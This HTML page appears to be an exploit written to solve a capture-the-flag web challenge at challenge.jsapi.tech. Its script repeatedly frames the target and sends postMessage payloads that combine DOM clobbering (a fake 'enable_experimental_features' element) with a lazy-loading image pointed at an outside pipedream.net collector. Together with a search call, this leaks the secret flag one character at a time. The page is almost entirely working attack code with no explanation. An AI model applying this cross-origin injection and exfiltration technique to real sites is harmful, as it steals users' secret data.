<html>
    <body>
    </body>
    <script>
        const sleep = (milliseconds) => {
            return new Promise(resolve => setTimeout(resolve, milliseconds))
        }

        (async () => {
            const CURR_FLAG = "nite{hello"
            const CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_}"

            for (let char of CHARSET) {
                const frame = document.createElement("iframe")
                frame.width = "100%"
                frame.height = "100%"
                frame.src = "https://challenge.jsapi.tech"
                document.body.appendChild(frame)
                
                await sleep(500);

                frame.contentWindow.postMessage(
                    {
                        op: "preview",
                        payload: `<a href="asdf" id="enable_experimental_features">CLOBBERED</a><img src="https://enrueq28ozwok.x.pipedream.net?nope=${CURR_FLAG + char}" loading="lazy">`
                    },
                    "*"
                )
                frame.contentWindow.postMessage(
                    {
                        op: "search",
                        payload: CURR_FLAG + char
                    },
                    "*"
                )
                
                await sleep(500);

                frame.remove()
            }
        })()
    </script>
</html>